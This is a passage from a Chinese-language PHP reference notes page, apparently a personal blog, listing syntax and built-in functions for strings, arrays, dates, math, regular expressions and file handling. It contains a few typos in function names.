转化类型。</span></span><br><span class="line"><span class="title function_ invoke__">Settype</span>( <span class="variable">$name</span> , type );</span><br><span class="line">————————————————————</span><br><span class="line"><span class="comment">// 八进制：0num（输出时系统会自动转化成十进制），其他同C。</span></span><br><span class="line"><span class="comment">// bin：二，oct：八，dec：十，hex：十六。</span></span><br><span class="line"><span class="title function_ invoke__">Decbin</span>(); <span class="comment">//十转二</span></span><br><span class="line"><span class="title function_ invoke__">Bindec</span>(); <span class="comment">//二转十</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断数为空</span></span><br><span class="line"><span class="title function_ invoke__">Empty</span>();</span><br><span class="line"><span class="comment">// 判断数存在</span></span><br><span class="line"><span class="title function_ invoke__">Isset</span>();</span><br></pre></td></tr></table></figure><h3 id="6-运算符"><a href="#6-运算符" class="headerlink" title="6 运算符"></a>6 运算符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 运算符大部分同理 c</span></span><br><span class="line"><span class="comment">// 数值判断</span></span><br><span class="line">== / !=</span><br><span class="line"><span class="comment">// 数值和类型判断</span></span><br><span class="line">=== / !==</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 连接运算符</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="comment">// 上面字符串$a$b拼接后赋值给$a，也可以写成下面 </span></span><br><span class="line"><span class="variable">$a</span> .= <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误抑制符：在语句前加 @ ，出错将不会报错</span></span><br><span class="line">@<span class="keyword">if</span>(<span class="number">0</span>/<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="7-输入输出"><a href="#7-输入输出" class="headerlink" title="7 输入输出"></a>7 输入输出</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输出一个或多个语句或变量。（不能输出bool判断，数组，类等）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;html&quot;</span>,str,...; </span><br><span class="line"><span class="comment">// 特殊常量的输出。（例：&quot;-_-&quot;）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">constant</span>( <span class="string">&quot;str&quot;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示数值，可用于类。</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示数值和类型。</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(obj);</span><br></pre></td></tr></table></figure><h3 id="8-判断"><a href="#8-判断" class="headerlink" title="8 判断"></a>8 判断</h3><blockquote><p>同C<br>endif，endswitch</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一定要用三等于，否则找到位置为0时一样是false。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)=== <span class="literal">false</span>)</span><br><span class="line">&#123; <span class="keyword">echo</span> <span class="string">&#x27;没有找到&#x27;</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="9-循环"><a href="#9-循环" class="headerlink" title="9 循环"></a>9 循环</h3><blockquote><p>同C++<br>endwhile（没有dowhile），endforeach<br>为了美观可以把 for的<br> <strong>{</strong>  替换成  <strong>:</strong><br> <strong>} </strong> 替换成  <strong>endfor</strong></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 下面两者等价</span></span><br><span class="line"><span class="keyword">for</span>( ;; ) &#123;&#125;</span><br><span class="line"><span class="keyword">for</span>( ;; ): <span class="keyword">endfor</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// foreach 遍历值</span></span><br><span class="line"><span class="keyword">foreach</span>( <span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$v</span> )</span><br><span class="line"><span class="keyword">foreach</span>( <span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span> )</span><br></pre></td></tr></table></figure><h3 id="10-字符串"><a href="#10-字符串" class="headerlink" title="10 字符串"></a>10 字符串</h3><ul><li><p>单双引号</p><ul><li>单引号：不解释，直接输出。</li><li>双引号：变量解释后输出。</li></ul></li><li><p>结构化字符串</p><blockquote><p>会保持原有结构，所有东西都是字符串。（要识别变量应当加引号）</p><p>如：<code>&quot;$a&quot;</code></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// limit：边界符，首尾应当一致，首尾后不跟东西，尾必须顶格。</span></span><br><span class="line"><span class="comment">// nowdoc字符串：没有单引号的单引号字符串。</span></span><br><span class="line"><span class="variable">$str</span> = &lt;&lt;&lt; <span class="string">&quot;limit&quot;</span> </span><br><span class="line">...</span><br><span class="line">limit;</span><br><span class="line"></span><br><span class="line"><span class="comment">// heredoc字符串：没有双引号的双引号字符串。</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&lt;&lt;&lt; limit</span></span><br><span class="line"><span class="string">str</span></span><br><span class="line"><span class="string">limit</span>;</span><br></pre></td></tr></table></figure></li><li><p>字符串函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字符串长度</span></span><br><span class="line"><span class="title function_ invoke__">strlen</span>();</span><br><span class="line"><span class="comment">// 扩展（去除分号）</span></span><br><span class="line">extension = php_mbstring.dll;</span><br><span class="line"><span class="comment">// 按字符编码计算字符串长度</span></span><br><span class="line"><span class="title function_ invoke__">mb_strlen</span>(<span class="variable">$str</span>,[ encoding ]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串函数</span></span><br><span class="line"><span class="comment">// 将数组中的元素按照某个规则连接成一个字符串。</span></span><br><span class="line"><span class="title function_ invoke__">lmplode</span>(exp,<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 将字符串按照某个格式进行分割，变成数组。</span></span><br><span class="line"><span class="title function_ invoke__">Explode</span>(<span class="variable">$c</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">//按照指定长度拆分字符串得到数组</span></span><br><span class="line"><span class="title function_ invoke__">Str_split</span>(<span class="variable">$str</span>,len);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 去除两边指定字符（还有 Ltrim，Rtrim）</span></span><br><span class="line"><span class="title function_ invoke__">Trim</span>(<span class="variable">$str</span>,[,<span class="variable">$c</span>]);</span><br><span class="line"><span class="comment">// 指定位置开始截取字符串，可以截取指定长度。（不指定到最后）</span></span><br><span class="line"><span class="title function_ invoke__">Substr</span>(<span class="variable">$str</span>,start[,len]);</span><br><span class="line"><span class="comment">// 从指定位置开始，输出 c 在 str 出现的一个位置后面的字符串</span></span><br><span class="line"><span class="title function_ invoke__">Strstr</span>(<span class="variable">$str</span>,<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全部小写</span></span><br><span class="line"><span class="title function_ invoke__">Strtolower</span>($str<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// 全部大写</span></span><br><span class="line"><span class="title function_ invoke__">Strtoupper</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// 首字母大写</span></span><br><span class="line"><span class="title function_ invoke__">uctirst</span>(<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// find在str中首次出现的位置，起始位置0</span></span><br><span class="line"><span class="title function_ invoke__">strpos</span>(<span class="variable">$str</span>,find,[start]); </span><br><span class="line"><span class="comment">// 查找find在str最后一次出现的位置</span></span><br><span class="line"><span class="title function_ invoke__">strrpos</span>(<span class="variable">$str</span>,find,[start]);</span><br><span class="line"><span class="comment">//（以下查找不区分大小写）</span></span><br><span class="line"><span class="comment">// 查找find在str首次出现的位置</span></span><br><span class="line"><span class="title function_ invoke__">stripos</span>(<span class="variable">$str</span>,find,[start]);</span><br><span class="line"><span class="comment">// 查找find在str最后一次出现的位置</span></span><br><span class="line"><span class="title function_ invoke__">strripos</span>(<span class="variable">$str</span>,find,[start]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将str中的find替换成replace，可替换count处</span></span><br><span class="line"><span class="title function_ invoke__">str_replace</span>(find,replace,<span class="variable">$str</span>,[&amp;count]);</span><br><span class="line"><span class="comment">// 不区分大小写</span></span><br><span class="line"><span class="title function_ invoke__">str_ireplace</span>(find,replace,<span class="variable">$str</span>,[&amp;count]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化输出（同c）</span></span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;%d&quot;</span>,num);</span><br><span class="line"><span class="comment">// 把格式化的字符串写入变量中</span></span><br><span class="line"><span class="variable">$info</span> = <span class="string">&#x27;age:%d&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">sprintf</span>(<span class="variable">$info</span>,num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重复某个字符串N次</span></span><br><span class="line"><span class="title function_ invoke__">Str_repeat</span>(<span class="variable">$str</span>,N);</span><br><span class="line"><span class="comment">// 随机打乱字符串</span></span><br><span class="line"><span class="title function_ invoke__">Str_shuffle</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把str中对应字符转换为 HTML 实体</span></span><br><span class="line"><span class="title function_ invoke__">htmlentities</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// 剥去str中的 HTML 标签</span></span><br><span class="line"><span class="title function_ invoke__">strip_tags</span>(<span class="variable">$str</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 在预定义字符之前添加反斜杠</span></span><br><span class="line"><span class="title function_ invoke__">addslashes</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// 删除由 addslashes() 函数添加的反斜杠</span></span><br><span class="line"><span class="title function_ invoke__">stripslashes</span>(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure></li></ul><h3 id="11-数组"><a href="#11-数组" class="headerlink" title="11 数组"></a>11 数组</h3><ul><li>不填下标默认从最大数字下标向后加。</li><li>下标所有都是整数：索引数组。</li><li>下标所有都是字符串：关联数组。</li><li>下标混合：混合数组。</li><li>true，false，null 自动变成 1，0，” “。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义数组（类似 js）</span></span><br><span class="line"><span class="variable">$name</span> = <span class="keyword">array</span>( elem1 , elem2 , ... );</span><br><span class="line"><span class="variable">$name</span> = [ elem1 , elem2 , ... ];</span><br><span class="line"><span class="variable">$name</span>[] = value1;</span><br><span class="line"><span class="variable">$name</span>[ index ] = value;</span><br><span class="line"><span class="comment">// 定义关联数组</span></span><br><span class="line"><span class="variable">$name</span> = <span class="keyword">array</span>( <span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;value&#x27;</span> , ... )</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下标不动，顺序/逆序排序</span></span><br><span class="line"><span class="title function_ invoke__">sort</span>(<span class="variable">$arr</span>); / <span class="title function_ invoke__">rsort</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 下标跟随，顺序/逆序排序</span></span><br><span class="line"><span class="title function_ invoke__">asort</span>(<span class="variable">$arr</span>); / <span class="title function_ invoke__">arsort</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 按键名排序</span></span><br><span class="line"><span class="title function_ invoke__">ksort</span>(<span class="variable">$arr</span>); / <span class="title function_ invoke__">krsort</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 随机打乱</span></span><br><span class="line"><span class="title function_ invoke__">shuffle</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 指针置首/尾</span></span><br><span class="line"><span class="title function_ invoke__">reset</span>(<span class="variable">$arr</span>); / <span class="title function_ invoke__">end</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 指针下移/上移并返回上一/下一元素值</span></span><br><span class="line"><span class="title function_ invoke__">next</span>(<span class="variable">$arr</span>); / <span class="title function_ invoke__">prev</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 获得当前元素值/键</span></span><br><span class="line"><span class="title function_ invoke__">current</span>(<span class="variable">$arr</span>); / <span class="title function_ invoke__">key</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 注意：指针移动超过数组后不能用 next 和 prev 调整指针位置，要用 reset 和 end。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组长</span></span><br><span class="line"><span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 最大最小</span></span><br><span class="line"><span class="title function_ invoke__">max</span>(<span class="variable">$arr</span>);<span class="title function_ invoke__">min</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 往数组中加入一个元素（数组后面）</span></span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>,<span class="keyword">mixed</span> <span class="variable">$var</span>[, <span class="keyword">mixed</span> $... ]);</span><br><span class="line"><span class="comment">// 从数组中取出一个元素（数组后面）</span></span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 从数组中加入一个元素（数组前面）</span></span><br><span class="line"><span class="title function_ invoke__">array_unshift</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>,<span class="keyword">mixed</span> <span class="variable">$var</span>[, <span class="keyword">mixed</span> $... ]);</span><br><span class="line"><span class="comment">// 从数组中取出一个元素（数组前面）</span></span><br><span class="line"><span class="title function_ invoke__">array_shift</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 统计所有元素的和</span></span><br><span class="line"><span class="title function_ invoke__">array_sum</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 统计数组中所有值出现的个数</span></span><br><span class="line"><span class="title function_ invoke__">array_count_values</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 数组元素逆转</span></span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 把一个或多个数组合并为一个数组</span></span><br><span class="line"><span class="title function_ invoke__">array_merge</span>(<span class="variable">$arr1</span>,[,<span class="variable">$arr2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断arr中是否存在指定的key</span></span><br><span class="line"><span class="title function_ invoke__">array_key_exists</span>(key,<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 判断str值在arr中，type是否需要类型相同</span></span><br><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="variable">$str</span>,<span class="variable">$arr</span>,type);</span><br><span class="line"><span class="comment">// 搜某个value，返回key</span></span><br><span class="line"><span class="title function_ invoke__">array_search</span>(<span class="variable">$str</span>,<span class="variable">$arr</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 去重</span></span><br><span class="line"><span class="title function_ invoke__">array_unique</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取一个数组的所有下标，返回一个索引数组</span></span><br><span class="line"><span class="title function_ invoke__">array_keys</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 获取一个数组的所有值，返回一个索引数组</span></span><br><span class="line"><span class="title function_ invoke__">array_values</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure><h3 id="12-函数"><a href="#12-函数" class="headerlink" title="12 函数"></a>12 函数</h3><h4 id="12-1-自定义函数"><a href="#12-1-自定义函数" class="headerlink" title="12.1 自定义函数"></a>12.1 自定义函数</h4><blockquote><p>同C++：默认值。</p><p>不同C：函数定义可以放在函数执行之后，因为他会先编译再执行，编译时代码段已经有了函数。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数中使用全局变量（不存在会直接生成）</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="comment">//可以有闭包，匿名函数。（use是将外部变量保留传递给内部用）</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p><strong>系统函数</strong></p><h4 id="12-2-输出"><a href="#12-2-输出" class="headerlink" title="12.2 输出"></a>12.2 输出</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输出，本质是结构不是函数，返回1，可以不用括号。</span></span><br><span class="line"><span class="keyword">print</span>();</span><br><span class="line"><span class="comment">// 只输出值。</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>();</span><br><span class="line"><span class="comment">// 输出值和类型。</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br></pre></td></tr></table></figure><h4 id="12-3-时间"><a href="#12-3-时间" class="headerlink" title="12.3 时间"></a>12.3 时间</h4><blockquote><p><a href="https://www.runoob.com/php/php-date.html">date()</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 日期（参数一填格式化输出, y m d h i s分别表示年月日时分秒，后一个表示时间戳，默认当前）</span></span><br><span class="line"><span class="title function_ invoke__">date</span>(format,[<span class="title function_ invoke__">time</span>()]);</span><br><span class="line"><span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="number">1462686882</span>);</span><br><span class="line"><span class="comment">// 时间戳</span></span><br><span class="line"><span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="comment">// 时间戳，微秒级</span></span><br><span class="line"><span class="title function_ invoke__">microtime</span>();</span><br><span class="line"><span class="comment">// 正确的输入的英文格式都能转化成时间戳</span></span><br><span class="line"><span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;str&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="12-4-数学"><a href="#12-4-数学" class="headerlink" title="12.4 数学"></a>12.4 数学</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">max</span>();</span><br><span class="line"><span class="title function_ invoke__">min</span>();</span><br><span class="line"><span class="title function_ invoke__">pow</span>();</span><br><span class="line"><span class="title function_ invoke__">abs</span>();</span><br><span class="line"><span class="title function_ invoke__">sqrt</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定区间的随机整数</span></span><br><span class="line"><span class="title function_ invoke__">rand</span>([min],max);</span><br><span class="line"><span class="comment">// 同rand()，效率比rand()高</span></span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="comment">// 四舍五入</span></span><br><span class="line"><span class="title function_ invoke__">round</span>();</span><br><span class="line"><span class="comment">// 上取整</span></span><br><span class="line"><span class="title function_ invoke__">ceil</span>();</span><br><span class="line"><span class="comment">// 下取整</span></span><br><span class="line"><span class="title function_ invoke__">floor</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转化 整形/浮点/字符串</span></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="variable">$var</span>);</span><br><span class="line"><span class="title function_ invoke__">floatval</span>(<span class="variable">$var</span>);</span><br><span class="line"><span class="title function_ invoke__">strval</span>(<span class="variable">$var</span>);</span><br></pre></td></tr></table></figure><h4 id="12-5-函数参数"><a href="#12-5-函数参数" class="headerlink" title="12.5 函数参数"></a>12.5 函数参数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检测函数名字是否存在</span></span><br><span class="line"><span class="title function_ invoke__">function_exists</span>(func);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数内使用</span></span><br><span class="line"><span class="comment">// 获得函数第 num 个参数</span></span><br><span class="line"><span class="title function_ invoke__">func_get_arg</span>( num );</span><br><span class="line"><span class="comment">// 获得函数全部参数</span></span><br><span class="line"><span class="title function_ invoke__">func_get_args</span>();</span><br><span class="line"><span class="comment">// 获得函数参数</span></span><br><span class="line"><span class="title function_ invoke__">func_num_args</span>();</span><br></pre></td></tr></table></figure><h4 id="12-6-检验函数"><a href="#12-6-检验函数" class="headerlink" title="12.6 检验函数"></a>12.6 检验函数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检验$var是否定义。已定义检测是否不为NULL</span></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$var</span>);</span><br><span class="line"><span class="comment">// 检测是否为空</span></span><br><span class="line"><span class="comment">// 1.未定义</span></span><br><span class="line"><span class="comment">// 2.值是否为0</span></span><br><span class="line"><span class="keyword">empty</span>(<span class="variable">$var</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否是*</span></span><br><span class="line">is_*();</span><br><span class="line"><span class="comment">// string/int/float/bool/null/array</span></span><br><span class="line"><span class="title function_ invoke__">is_int</span>();</span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(); <span class="comment">// 是否是数字</span></span><br></pre></td></tr></table></figure><h4 id="12-7-正则表达式"><a href="#12-7-正则表达式" class="headerlink" title="12.7 正则表达式"></a>12.7 正则表达式</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首个匹配则终止（$pattern=&quot;/ exp /&quot;：双斜杠中写表达式）</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="keyword">string</span> <span class="variable">$pattern</span>,obj);</span><br><span class="line"><span class="comment"># 匹配所有</span></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="keyword">string</span> <span class="variable">$pattern</span>,obj);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断输入的是数字</span></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/^\d+$/&quot;</span>,<span class="variable">$num</span>)</span><br></pre></td></tr></table></figure><h3 id="13-文件"><a href="#13-文件" class="headerlink" title="13 文件"></a>13 文件</h3><h4 id="13-1-文件读写"><a href="#13-1-文件读写" class="headerlink" title="13.1 文件读写"></a>13.1 文件读写</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 打开文件（方式rwax,+,b）（x是只写，w是写入）</span></span><br><span class="line"><span class="comment">// http只能只读，ftp只能只读或只写</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;https://www.baidu.com/&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;ftp://user:password@en.cn/exam.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;/home/file.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭文件</span></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件</span></span><br><span class="line"><span class="comment">// 读取整个文件，指定长度</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">fread</span>(resource handle,<span class="keyword">int</span> length);</span><br><span class="line"><span class="comment">// 一行字符，读到回车或length-1就返回</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">fgets</span>(resource handle[,<span class="keyword">int</span> length]);</span><br><span class="line"><span class="comment">// 一行字符并去掉所有html和php标记</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">fgetss</span>(resource handle[,<span class="keyword">int</span> length]);</span><br><span class="line"><span class="comment">// 一个字符</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">fgetc</span>(resource handle);</span><br><span class="line"><span class="comment">// 无需开关文件就可读</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">file_get_contents</span>(resource handle);</span><br><span class="line"><span class="comment">// 文件读入数组，每个元素对应一行</span></span><br><span class="line"><span class="keyword">array</span> <span class="title function_ invoke__">file</span>(resource handle);</span><br><span class="line"><span class="comment">// 读到缓冲，返回读取字符数</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">readfile</span>(resource handle);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件指针操作</span></span><br><span class="line"><span class="comment">// 移动到开头</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">rewind</span>(resource handle);</span><br><span class="line"><span class="comment">// 返回当前位置</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">ftell</span>(resource handle);</span><br><span class="line"><span class="comment">// 移动到指定位置（移动偏移量，未指定起始位置默认从文件开头开始）</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">fseek</span>(resource handle,<span class="keyword">int</span> offset[,<span class="keyword">int</span> origin]);</span><br><span class="line"><span class="comment">// origin取值：SEEK_SET(0):文件开头，SEEK_CUR(1):当前位置，SEEK_END(2)：文件末尾</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入文件</span></span><br><span class="line"><span class="comment">// 写入字符串（设置了长度会只写入length个字符）</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">fwrite</span>(resource handle,stirng stirng[,<span class="keyword">int</span> length]);</span><br><span class="line"><span class="comment">// 无需开文件就可以写（mode指定方式，FILE_APPEND:追加）</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">string</span> filename,<span class="keyword">string</span> data[,<span class="keyword">int</span> mode]);</span><br></pre></td></tr></table></figure><h4 id="13-2-文件操作"><a href="#13-2-文件操作" class="headerlink" title="13.2 文件操作"></a>13.2 文件操作</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件操作</span></span><br><span class="line"><span class="comment">// 复制</span></span><br><span class="line"><span class="title function_ invoke__">copy</span>(src,dest);</span><br><span class="line"><span class="comment">// 删除</span></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(dest);</span><br><span class="line"><span class="comment">// 重命名</span></span><br><span class="line"><span class="title function_ invoke__">rename</span>(old,<span class="keyword">new</span>);</span><br><span class="line"><span class="comment">// 文件截断</span></span><br><span class="line"><span class="title function_ invoke__">ftruncate</span>(src,length);</span><br><span class="line"><span class="comment">// 判断文件或文件夹存在</span></span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(dest);</span><br><span class="line"><span class="comment">// 判断路径存在且为文件</span></span><br><span class="line"><span class="title function_ invoke__">is_file</span>(name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件属性</span></span><br><span class="line"><span class="comment">// 文件大小</span></span><br><span class="line"><span class="variable">$fsize</span> = <span class="title function_ invoke__">filesize</span>(file);</span><br><span class="line"><span class="comment">// 文件类型</span></span><br><span class="line"><span class="title function_ invoke__">filetype</span>(file);</span><br><span class="line"><span class="comment">// 时间戳</span></span><br><span class="line"><span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,<span class="title function_ invoke__">filectime</span>(file));</span><br><span class="line"><span class="comment">// 修改时间</span></span><br><span class="line"><span class="title function_ invoke__">filemtime</span>(file);</span><br><span class="line"><span class="comment">// 访问时间</span></span><br><span class="line"><span class="title function_ invoke__">fileatime</span>(file);</span><br><span class="line"><span class="comment">// 物理路径</span></span><br><span class="line"><span class="title function_ invoke__">realpath</span>(file);</span><br><span class="line"><span class="comment">// 数组形式返回路径和文件名信息</span></span><br><span class="line"><span class="title function_ invoke__">pathinfo</span>(file);</span><br><span class="line"><span class="comment">// 相对当前文件的路径信息</span></span><br><span class="line"><span class="title function_ invoke__">dirname</span>(file);</span><br><span class="line"><span class="comment">// 文件名信息</span></span><br><span class="line"><span class="title function_ invoke__">basename</span>(file);</span><br><span class="line"><span class="comment">// 数组形式返回大部分属性值</span></span><br><span class="line"><span class="title function_ invoke__">stat</span>(file);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路径操作</span></span><br><span class="line"><span class="comment">// 新建目录</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(pathname);</span><br><span class="line"><span class="comment">// 删除目录</span></span><br><span class="line"><span class="title function_ invoke__">rmdir</span>(dirname);</span><br><span class="line"><span class="comment">// 取得当前文件所在目录</span></span><br><span class="line"><span class="title function_ invoke__">getcwd</span>(<span class="keyword">void</span>);</span><br><span class="line"><span class="comment">// 改变当前目录</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(dirname);</span><br><span class="line"><span class="comment">// 打开目录，返回目录指针</span></span><br><span class="line"><span class="title function_ invoke__">opendir</span>(path);</span><br><span class="line"><span class="comment">// 关闭目录，参数为目录指针</span></span><br><span class="line"><span class="title function_ invoke__">closedir</span>(*p);</span><br><span class="line"><span class="comment">// 遍历目录</span></span><br><span class="line"><span class="title function_ invoke__">readdir</span>();</span><br><span class="line"><span class="comment">// 数组形式遍历目录，sort设置为True或False</span></span><br><span class="line"><span class="title function_ invoke__">scandir</span>(path,sort);</span><br><span class="line"><span class="comment">// 目录指针重置回目录开头</span></span><br><span class="line"><span class="title function_ invoke__">rewinddir</span>(*p);</span><br></pre></td></tr></table></figure><h3 id="13-类与对象"><a href="#13-类与对象" class="headerlink" title="13 类与对象"></a>13 类与对象</h3><ul><li><p>基础</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 